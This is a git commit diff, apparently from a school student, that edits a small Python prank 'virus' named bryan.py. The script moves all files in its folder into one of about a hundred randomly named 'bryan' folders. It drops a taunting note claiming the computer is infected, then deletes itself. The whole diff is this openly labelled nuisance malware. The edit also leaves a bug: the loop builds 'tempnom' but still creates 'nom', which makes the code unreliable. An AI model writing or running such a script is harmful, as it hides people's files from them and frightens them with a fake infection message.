8d0b2d4afe4e696e98df1304d719dfe1d68d5e39
MARAIS Mathieu <MARAIS@lan.sio.lyceefulbert.fr>
2023-09-25 10:07:03 +0200

    final bryan la menace

--- bryan.py
+++ bryan.py
@@ -1,7 +1,8 @@
 import shutil, os, random
 
+nombre = 100
 # Choix du dossier contenant les fichiers
-choix = random.randint(1,101) 
+choix = random.randint(1,nombre+1) 
 nom = "bryan" + str(choix)  
 os.mkdir(nom)
 
@@ -11,17 +12,15 @@ for file in dir_list:
     shutil.move(file,nom)  
 
 # Création de dossier bryan pour cacher le choisi
-for i in range (1,101):     
+for i in range (1,nombre+1):     
     if i != choix:         
-        nom = "bryan" + str(i)         
+        tempnom = "bryan" + str(i)         
         os.mkdir(nom)
-        fakef = open(nom + "/pasici.py","w+")
-        fakef.close()
 
 # Rédaction du fichier texte 
 f = open("Ne_Paniquez_Pas.txt", "w+")
-f.write("Votre ordinateur a été infécté par le virus bryan.py !!!\nTous vos fichiers ont été placés dans un des dossier bryan\n\nBonne chance pour les retrouver xD HAHA ^^\n-Bryan la menace.")
+f.write("Votre ordinateur a été infécté par le virus bryan.py !!!\nTous vos fichiers ont été placés dans un des dossier bryan\nBonne chance pour les retrouver xD HAHA ^^\n-Bryan la menace.")
 f.close()
 
 # Suppression du fichier python
-os.remove("bryan" + str(choix) + "/bryan.py")
+os.remove(nom + "/bryan.py")
